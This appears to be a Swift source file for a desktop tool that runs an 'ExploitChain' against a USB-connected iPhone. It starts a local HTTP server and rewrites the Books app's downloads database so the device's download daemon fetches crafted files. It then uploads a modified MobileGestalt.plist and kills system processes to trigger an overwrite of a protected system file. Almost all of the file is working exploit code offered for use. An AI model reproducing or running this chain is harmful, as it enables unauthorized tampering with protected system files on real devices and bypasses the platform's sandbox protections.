import Foundation
#if canImport(FoundationNetworking)
import FoundationNetworking
#endif

class SimpleHTTPServer {
    private var serverSocket: Int32 = -1
    private var isRunning = false
    private let port: UInt16
    private let documentRoot: String
    private var acceptThread: Thread?
    
    init(port: UInt16 = 0, documentRoot: String) {
        self.port = port
        self.documentRoot = documentRoot
    }
    
    func start() throws -> (String, Int) {
        serverSocket = socket(AF_INET, SOCK_STREAM, 0)
        
        guard serverSocket >= 0 else {
            let error = String(cString: strerror(errno))
            
            throw NSError(domain: "HTTPServer", code: 1, userInfo: [NSLocalizedDescriptionKey: "Failed to create socket: \(error)"])
        }
        
        var opt: Int32 = 1
        let setOptResult = setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, &opt, socklen_t(MemoryLayout<Int32>.size))

        
        var addr = sockaddr_in()
        addr.sin_family = sa_family_t(AF_INET)
        addr.sin_port = port.bigEndian
        addr.sin_addr.s_addr = INADDR_ANY.bigEndian

        
        let bindResult = withUnsafePointer(to: &addr) {
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                bind(serverSocket, $0, socklen_t(MemoryLayout<sockaddr_in>.size))
            }
        }
        
       
        guard bindResult >= 0 else {
            let error = String(cString: strerror(errno))
            close(serverSocket)
           
            
            throw NSError(domain: "HTTPServer", code: 2, userInfo: [NSLocalizedDescriptionKey: "Failed to bind socket: \(error)"])
        }
        
        let listenResult = listen(serverSocket, 5)
        
        guard listenResult >= 0 else {
            let error = String(cString: strerror(errno))
            close(serverSocket)
            throw NSError(domain: "HTTPServer", code: 3, userInfo: [NSLocalizedDescriptionKey: "Failed to listen: \(error)"])
        }
        
        var actualAddr = sockaddr_in()
        
        var len = socklen_t(MemoryLayout<sockaddr_in>.size)
        withUnsafeMutablePointer(to: &actualAddr) {
            
            $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                getsockname(serverSocket, $0, &len)
            }
        }
        
        let actualPort = Int(UInt16(bigEndian: actualAddr.sin_port))
        
        let ipAddress = getLocalIPAddress()
        
        isRunning = true
        acceptThread = Thread { [weak self] in
            self?.acceptLoop()
        }
        acceptThread?.start()
        
        
        return (ipAddress, actualPort)
    }
    
    func stop() {
        isRunning = false
        if serverSocket >= 0 {
            close(serverSocket)
            serverSocket = -1
        }
    }
    
    private func acceptLoop() {
        
        while isRunning {
            
            var clientAddr = sockaddr_in()
            var clientLen = socklen_t(MemoryLayout<sockaddr_in>.size)
            
            let clientSocket = withUnsafeMutablePointer(to: &clientAddr) {
                $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                    accept(serverSocket, $0, &clientLen)
                }
            }
            
            
            guard clientSocket >= 0 else {
                if isRunning {
                    let error = String(cString: strerror(errno))
        
                }
                continue
            }
            
           
            handleClient(socket: clientSocket)
        }
        
        print("server test shit: acceptLoop() exiting")
    }
    
    private func handleClient(socket: Int32) {
        defer { close(socket) }
        
        var buffer = [UInt8](repeating: 0, count: 4096)
        let bytesRead = recv(socket, &buffer, buffer.count, 0)
        
        
        guard bytesRead > 0 else { return }
    
        guard let request = String(bytes: buffer[0..<bytesRead], encoding: .utf8) else { return }
        let lines = request.components(separatedBy: "\r\n")
        guard let firstLine = lines.first else { return }
        
        let components = firstLine.components(separatedBy: " ")
        guard components.count >= 2 else { return }
        
        var requestPath = components[1]
        if requestPath.hasPrefix("/") {
            requestPath.removeFirst()
        }
        if requestPath.isEmpty {
            requestPath = "index.html"
        }
        
        let filePath = (documentRoot as NSString).appendingPathComponent(requestPath)
        
        if FileManager.default.fileExists(atPath: filePath),
           let fileData = try? Data(contentsOf: URL(fileURLWithPath: filePath)) {
            
            let contentType = getContentType(for: requestPath)
            let response = "HTTP/1.1 200 OK\r\nContent-Type: \(contentType)\r\nContent-Length: \(fileData.count)\r\n\r\n"
            
            if let responseData = response.data(using: .utf8) {
                responseData.withUnsafeBytes { buffer in
                    
                    send(socket, buffer.baseAddress, responseData.count, 0)
                }
            }
            
            fileData.withUnsafeBytes { buffer in
                send(socket, buffer.baseAddress, fileData.count, 0)
            }
        } else {
            let notFound = "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n"
            if let notFoundData = notFound.data(using: .utf8) {
                notFoundData.withUnsafeBytes { buffer in
                    send(socket, buffer.baseAddress, notFoundData.count, 0)
                }
            }
        }
    }
    
    private func getContentType(for filename: String) -> String {
        let ext = (filename as NSString).pathExtension.lowercased()
        switch ext {
        case "sqlite", "sqlitedb", "db": return "application/x-sqlite3"
            
        case "plist": return "application/x-plist"
        case "shm", "wal": return "application/octet-stream"
            
        default: return "application/octet-stream"
        }
    }
    
    private func getLocalIPAddress() -> String {
        var address: String?
        var ifaddr: UnsafeMutablePointer<ifaddrs>?
        
        guard getifaddrs(&ifaddr) == 0 else {
            return "192.168.1.1"
        }
        guard let firstAddr = ifaddr else {
            return "192.168.1.1"
        }
        
        defer { freeifaddrs(ifaddr) }
        
        for ifptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next }) {
            let interface = ifptr.pointee
            let addrFamily = interface.ifa_addr.pointee.sa_family
            
            if addrFamily == UInt8(AF_INET) {
                let name = String(cString: interface.ifa_name)
                
                if name == "en0" {
                    var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                    getnameinfo(interface.ifa_addr, socklen_t(interface.ifa_addr.pointee.sa_len),
                              &hostname, socklen_t(hostname.count),
                              nil, socklen_t(0), NI_NUMERICHOST)
                    let addr = String(cString: hostname)
                    
                    if !addr.hasPrefix("127.") && !addr.isEmpty {
                        print("Found en0 WiFi address: \(addr)")
                        return addr
                    }
                }
            }
        }
        
        
        for ifptr in sequence(first: firstAddr, next: { $0.pointee.ifa_next }) {
            let interface = ifptr.pointee
            let addrFamily = interface.ifa_addr.pointee.sa_family
            
            if addrFamily == UInt8(AF_INET) {
                let name = String(cString: interface.ifa_name)
                
                var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                getnameinfo(interface.ifa_addr, socklen_t(interface.ifa_addr.pointee.sa_len),
                          &hostname, socklen_t(hostname.count),
                          nil, socklen_t(0), NI_NUMERICHOST)
                let addr = String(cString: hostname)
                
                print("Interface \(name): \(addr)")
                
                if !addr.hasPrefix("127.") && !addr.isEmpty {
                    print("Using address from \(name): \(addr)")
                    address = addr
                }
            }
        }
        
        guard let finalAddress = address else {
            print("stupid network interface is not available. bailing.")
            return "192.168.1.1"
        }
        
        return finalAddress
    }
    
    deinit {
        stop()
    }
}

class ExploitChain {
    
    static let shared = ExploitChain()
    
    private init() {}
    
    func executeExploit(device: Device, modifiedPlistURL: URL, logger: MobileGestaltManager) async throws {
        await logger.log("Starting exploit chain...", level: .info)
        
        guard let bundlePath = Bundle.main.resourcePath else {
            throw NSError(domain: "ExploitChain", code: 100, userInfo: [NSLocalizedDescriptionKey: "Bundle path not found"])
        }
        
        await logger.log("Starting iEscaper server...", level: .info)
        let httpServer = SimpleHTTPServer(port: 0, documentRoot: bundlePath)
        
        let (serverIP, serverPort) = try httpServer.start()
        
        defer {
            httpServer.stop()
            Task { @MainActor in
                await logger.log("HTTP server stopped", level: .info)
            }
        }
        
        let uuid = try await findBookAssetContainerUUID(device: device, logger: logger)
        
        try await modifyDownloadsDatabase(uuid: uuid, device: device, logger: logger, serverIP: serverIP, serverPort: serverPort)
        try await triggerExploit(device: device, modifiedPlistURL: modifiedPlistURL, uuid: uuid, logger: logger)
    }
    
    private func findBookAssetContainerUUID(device: Device, logger: MobileGestaltManager) async throws -> String {
        await logger.log("Looking for bookassetd container UUID...", level: .info)
        
        let uuidFileURL = FileManager.default.temporaryDirectory.appendingPathComponent("uuid.txt")
        var uuid: String?
        
        if FileManager.default.fileExists(atPath: uuidFileURL.path),
           let savedUUID = try? String(contentsOf: uuidFileURL, encoding: .utf8),
           !savedUUID.isEmpty {
            await logger.log("Using cached UUID: \(savedUUID)", level: .success)
            
            uuid = savedUUID
        } else {
            await logger.log("Starting UUID detection...", level: .info)
            
            var foundUUID: String?
            let timeoutSeconds: TimeInterval = 120.0
            
            try await withTimeout(seconds: timeoutSeconds) {
                try await GeoiDeviceManager.shared.awaitsyslogShit(udid: device.udid) { line in
                    if line.contains("bookassetd") && line.contains("/Documents/BLDownloads/") {
                        if let detectedUUID = self.extractUUID(from: line) {
                            foundUUID = detectedUUID
                            
                            Task { @MainActor in
                                await logger.log("Found UUID: \(detectedUUID)", level: .success)
                            }
                            return true
                        }
                    }
                    return false
                }
            }
            
            guard let detectedUUID = foundUUID else {
                await logger.log("Failed to detect UUID automatically", level: .error)
                await logger.log("Please make sure you downloaded a book in the Books app", level: .error)
                throw NSError(domain: "ExploitChain", code: 1, userInfo: [NSLocalizedDescriptionKey: "UUID not found"])
            }
            
            uuid = detectedUUID
            try? detectedUUID.write(to: uuidFileURL, atomically: true, encoding: .utf8)
        }
        
        guard let finalUUID = uuid else {
            throw NSError(domain: "ExploitChain", code: 1, userInfo: [NSLocalizedDescriptionKey: "UUID not found"])
        }
        
        await logger.log("Launching Books app...", level: .info)
        try await GeoiDeviceManager.shared.launchAppPrimitive(udid: device.udid, bundleId: "com.apple.iBooks")
        
        do {
            try await Task.sleep(nanoseconds: 2_000_000_000)
        } catch {
        }
        
        return finalUUID
    }
    
    private func extractUUID(from line: String) -> String? {
        let pattern = "/var/containers/Shared/SystemGroup/([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})/"
        
        if let regex = try? NSRegularExpression(pattern: pattern, options: []),
           let match = regex.firstMatch(in: line, options: [], range: NSRange(line.startIndex..., in: line)),
           match.numberOfRanges > 1 {
            let uuidRange = Range(match.range(at: 1), in: line)
            if let uuidRange = uuidRange {
                return String(line[uuidRange])
            }
        }
        let fallbackPatterns = [
            "/SystemGroup/([A-F0-9-]+)/Documents/","SystemGroup/([A-F0-9-]+)/","/var/containers/Shared/SystemGroup/([A-F0-9-]+)/"
        ]
        
        for pattern in fallbackPatterns {
            if let range = line.range(of: pattern, options: .regularExpression) {
                let match = String(line[range])
                let uuid = match.components(separatedBy: "/")
                    .first { $0.count > 30 && $0.contains("-") }
                if let uuid = uuid {
                    return uuid
                }
            }
        }
        return nil
    }
    
    private func modifyDownloadsDatabase(uuid: String, device: Device, logger: MobileGestaltManager, serverIP: String, serverPort: Int) async throws {
        guard let bundlePath = Bundle.main.resourcePath else {
            throw NSError(domain: "ExploitChain", code: 2, userInfo: [NSLocalizedDescriptionKey: "Bundle path not found"])
        }
        let sourceDBPath = bundlePath + "/downloads.28.sqlitedb"
        let tempDBPath = FileManager.default.temporaryDirectory.path + "/tmp.downloads.28.sqlitedb"
        
        if !FileManager.default.fileExists(atPath: sourceDBPath) {
            await logger.log("Missing downloads.28.sqlitedb", level: .error)
            throw NSError(domain: "ExploitChain", code: 3, userInfo: [NSLocalizedDescriptionKey: "Missing exploit files"])
        }
        
        if FileManager.default.fileExists(atPath: tempDBPath) {
            try? FileManager.default.removeItem(atPath: tempDBPath)
        }
        
        try FileManager.default.copyItem(atPath: sourceDBPath, toPath: tempDBPath)
        
        let db = try SQLiteDatabase(path: tempDBPath)
        
        let bldbLocalPrefix = "/private/var/containers/Shared/SystemGroup/\(uuid)/Documents/BLDatabaseManager/BLDatabaseManager.sqlite"
        let bldbServerPrefix = "http://\(serverIP):\(serverPort)/BLDatabaseManager.sqlite"
        
        try db.executeUpdate("""
            UPDATE asset
            SET local_path = CASE
                WHEN local_path LIKE '%/BLDatabaseManager.sqlite'
                    THEN '\(bldbLocalPrefix)'
                WHEN local_path LIKE '%/BLDatabaseManager.sqlite-shm'
                    THEN '\(bldbLocalPrefix)-shm'
                WHEN local_path LIKE '%/BLDatabaseManager.sqlite-wal'
                    THEN '\(bldbLocalPrefix)-wal'
            END
            WHERE local_path LIKE '/private/var/containers/Shared/SystemGroup/%/Documents/BLDatabaseManager/BLDatabaseManager.sqlite%'
            """)
        
        try db.executeUpdate("""
            UPDATE asset
            SET url = CASE
                WHEN url LIKE '%/BLDatabaseManager.sqlite'
                    THEN '\(bldbServerPrefix)'
                WHEN url LIKE '%/BLDatabaseManager.sqlite-shm'
                    THEN '\(bldbServerPrefix)-shm'
                WHEN url LIKE '%/BLDatabaseManager.sqlite-wal'
                    THEN '\(bldbServerPrefix)-wal'
            END
            WHERE url LIKE '%/BLDatabaseManager.sqlite%'
            """)
        
        await logger.log("Modified downloads database with server URL: \(bldbServerPrefix)", level: .success)
        await logger.log("Database connection will remain open for journal files", level: .info)
    }
    
    private func uploadExploitFiles(device: Device, modifiedPlistURL: URL, uuid: String, logger: MobileGestaltManager) async throws {
        let tempDBPath = FileManager.default.temporaryDirectory.path + "/tmp.downloads.28.sqlitedb"
        let tempDBShmPath = FileManager.default.temporaryDirectory.path + "/tmp.downloads.28.sqlitedb-shm"
        let tempDBWalPath = FileManager.default.temporaryDirectory.path + "/tmp.downloads.28.sqlitedb-wal"
        
        await logger.log("Uploading com.apple.MobileGestalt.plist...", level: .info)
        try await GeoiDeviceManager.shared.uploadFile(to: device, localPath: modifiedPlistURL.path, remotePath: "com.apple.MobileGestalt.plist")
        
        await logger.log("Uploading Downloads/downloads.28.sqlitedb...", level: .info)
        try await GeoiDeviceManager.shared.uploadFile(to: device, localPath: tempDBPath, remotePath: "Downloads/downloads.28.sqlitedb")
        
        await logger.log("Uploading Downloads/downloads.28.sqlitedb-shm...", level: .info)
        try await GeoiDeviceManager.shared.uploadFile(to: device, localPath: tempDBShmPath, remotePath: "Downloads/downloads.28.sqlitedb-shm")
        
        await logger.log("Uploading Downloads/downloads.28.sqlitedb-wal...", level: .info)
        try await GeoiDeviceManager.shared.uploadFile(to: device, localPath: tempDBWalPath, remotePath: "Downloads/downloads.28.sqlitedb-wal")
    }
    
    private func triggerExploit(device: Device, modifiedPlistURL: URL, uuid: String, logger: MobileGestaltManager) async throws {
        await logger.log("Starting exploit trigger...", level: .info)
        
        await logger.log("Fetching process list...", level: .info)
        let processes = try await GeoiDeviceManager.shared.getProcessListPrimitive(udid: device.udid, logger: logger)
        
        if processes.isEmpty {
            await logger.log("Warning: Could not fetch process list", level: .warning)
        } else {
            await logger.log("Found \(processes.count) processes", level: .info)
        }
        
            var bookassetdPID: Int?
        
        
        for (pidStr, processInfo) in processes {
            if let name = processInfo["ProcessName"] as? String, name == "bookassetd", let pid = Int(pidStr) {
                bookassetdPID = pid
                await logger.log("Found bookassetd with PID: \(pid), killing...", level: .info)
                do {
                    try await GeoiDeviceManager.shared.killProcessPrimitive(udid: device.udid, pid: pid)
                    await logger.log("Successfully killed bookassetd", level: .success)
                } catch {
                    await logger.log("Failed to kill bookassetd: \(error.localizedDescription)", level: .warning)
                }
            }
        }
        for (pidStr, processInfo) in processes {
            if let name = processInfo["ProcessName"] as? String, name == "Books", let pid = Int(pidStr) {
                await logger.log("Found Books with PID: \(pid), killing...", level: .info)
                do {
                    try await GeoiDeviceManager.shared.killProcessPrimitive(udid: device.udid, pid: pid)
                    await logger.log("Successfully killed Books", level: .success)
                    
                    
                } catch {
                    await logger.log("Failed to kill Books: \(error.localizedDescription)", level: .warning)
                }
            }
        }
        await logger.log("Uploading exploit files...", level: .info)
        let tempDBPath = FileManager.default.temporaryDirectory.path + "/tmp.downloads.28.sqlitedb"
        let tempDBShmPath = FileManager.default.temporaryDirectory.path + "/tmp.downloads.28.sqlitedb-shm"
        let tempDBWalPath = FileManager.default.temporaryDirectory.path + "/tmp.downloads.28.sqlitedb-wal"
        await logger.log("Uploading com.apple.MobileGestalt.plist...", level: .info)
        try await GeoiDeviceManager.shared.uploadFile(to: device, localPath: modifiedPlistURL.path, remotePath: "com.apple.MobileGestalt.plist")
        await logger.log("Uploading Downloads/downloads.28.sqlitedb...", level: .info)
        try await GeoiDeviceManager.shared.uploadFile(to: device, localPath: tempDBPath, remotePath: "Downloads/downloads.28.sqlitedb")
        await logger.log("Uploading Downloads/downloads.28.sqlitedb-shm...", level: .info)
        try await GeoiDeviceManager.shared.uploadFile(to: device, localPath: tempDBShmPath, remotePath: "Downloads/downloads.28.sqlitedb-shm")
        await logger.log("Uploading Downloads/downloads.28.sqlitedb-wal...", level: .info)
        try await GeoiDeviceManager.shared.uploadFile(to: device, localPath: tempDBWalPath, remotePath: "Downloads/downloads.28.sqlitedb-wal")
        await logger.log("Files uploaded successfully", level: .success)
        for (pidStr, processInfo) in processes {
            if let name = processInfo["ProcessName"] as? String, name == "itunesstored", let pid = Int(pidStr) {
                await logger.log("Found itunesstored with PID: \(pid), killing...", level: .info)
                do {
                    try await GeoiDeviceManager.shared.killProcessPrimitive(udid: device.udid, pid: pid)
                    await logger.log("Successfully killed itunesstored", level: .success)
                } catch {
                    await logger.log("Failed to kill itunesstored: \(error.localizedDescription)", level: .warning)
                }
                break // I Only need to kill once
            }
        }
        
        await logger.log("Waiting for itunesstored to finish download...", level: .info)

        do {
            try await withTimeout(seconds: 120) {
                try await GeoiDeviceManager.shared.awaitsyslogShit(udid: device.udid) { line in
                    if line.contains("itunesstored") {
                      
                        Task { @MainActor in
                            await logger.log("itunesstored: \(line)", level: .info)
                        }
                        
                        if line.contains("6936249076851270152") {
                            if line.contains("Install complete") || line.contains("result: Failed") || line.contains("Marking download") || line.contains("finished") || line.contains("complete") || line.contains("error") || line.contains("failed") {
                                Task { @MainActor in
                                    await logger.log("Download processing detected!", level: .success)
                                }
                                return true
                            }
                        }
                    }
                    return false
                }
            }
        } catch {
            await logger.log("Timeout waiting for itunesstored - continuing anyway...", level: .warning)
        }

        try await Task.sleep(nanoseconds: 2_000_000_000)
        
        await logger.log("RIGHT BEFORE THE TRIGGER", level: .error)
        
        try await Task.sleep(nanoseconds: 2_000_000_000)
        let processesAfter = try await GeoiDeviceManager.shared.getProcessListPrimitive(udid: device.udid, logger: logger)
        
        for (pidStr, processInfo) in processesAfter {
            if let name = processInfo["ProcessName"] as? String, (name == "bookassetd" || name == "Books"), let pid = Int(pidStr) {
                await logger.log("Killing \(name) (PID: \(pid))...", level: .info)
                 
                try await GeoiDeviceManager.shared.killProcessPrimitive(udid: device.udid, pid: pid)
            }
        }
        
        await logger.log("Launching Books app...", level: .info)
        try await GeoiDeviceManager.shared.launchAppPrimitive(udid: device.udid, bundleId: "com.apple.iBooks")
        
        await logger.log("Waiting for MobileGestalt overwrite...", level: .info)
        await logger.log("You should see Stage 1 exploit message in Books", level: .warning)
        
        let successMessage = "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist) [Install-Mgr]: Marking download as [finished]"
        
        var exploitSuccessDetected = false
        
        do {
            try await withTimeout(seconds: 60) {
                try await GeoiDeviceManager.shared.awaitsyslogShit(udid: device.udid) { line in
                    if line.contains("bookassetd") && line.contains(successMessage) {
                        Task { @MainActor in
                            await logger.log("MobileGestalt overwrite confirmed!", level: .success)
                            await logger.log("---- WE OUT HERE ----", level: .error)
                        }
                        exploitSuccessDetected = true
                        return true
                    }
                    return false
                }
            }
        } catch {
            await logger.log("Timeout waiting for success confirmation", level: .warning)
        }
        let finalProcesses = try await GeoiDeviceManager.shared.getProcessListPrimitive(udid: device.udid, logger: logger)
        
        for (pidStr, processInfo) in finalProcesses {
            if let name = processInfo["ProcessName"] as? String, name == "bookassetd", let pid = Int(pidStr) {
                 await logger.log("Killing bookassetd (PID: \(pid))...", level: .info)
                try await GeoiDeviceManager.shared.killProcessPrimitive(udid: device.udid, pid: pid)
                break
            }
        }
         await logger.log("Respringing device...", level: .info)
        for (pidStr, processInfo) in finalProcesses {
            if let name = processInfo["ProcessName"] as? String, name == "backboardd", let pid = Int(pidStr) {
                try await GeoiDeviceManager.shared.killProcessPrimitive(udid: device.udid, pid: pid)
                await logger.log("Killed backboardd. Device should be respringing right about now.", level: .success)
                break
            }
        }
        if exploitSuccessDetected {
            await logger.log("---- EXPLOIT SUCCEEDED! ----", level: .success)
            
        } else {
            await logger.log("Stage 1 Succeeded but still waiting on stage 2. Did we fail tragically?", level: .warning)
        }
    }
    
    private func withTimeout(seconds: TimeInterval, operation: @escaping () async throws -> Void) async throws {
        try await withThrowingTaskGroup(of: Void.self) { group in
            group.addTask {
                try await operation()
            }
            
            group.addTask {
                try await Task.sleep(nanoseconds: UInt64(seconds * 1_000_000_000))
                throw NSError(domain: "ExploitChain", code: 999, userInfo: [NSLocalizedDescriptionKey: "Operation timed out"])
            }
            
            try await group.next()!
            group.cancelAll()
        }
    }
}

class SQLiteDatabase {
    private var db: OpaquePointer?
    
    init(path: String) throws {
        if sqlite3_open(path, &db) != SQLITE_OK {
            
            throw NSError(domain: "SQLiteDatabase", code: 1, userInfo: [NSLocalizedDescriptionKey: "Failed to open database"])
        }
    }
    
    func executeUpdate(_ sql: String) throws {
        var error: UnsafeMutablePointer<CChar>?
        if sqlite3_exec(db, sql, nil, nil, &error) != SQLITE_OK {
            let errorMessage = error.map { String(cString: $0) } ?? "Unknown error"
            
            sqlite3_free(error)
            throw NSError(domain: "SQLiteDatabase", code: 2, userInfo: [NSLocalizedDescriptionKey: errorMessage])
        }
    }
    func close() {
        sqlite3_close(db)
    }
    deinit {
        close()
    }
}
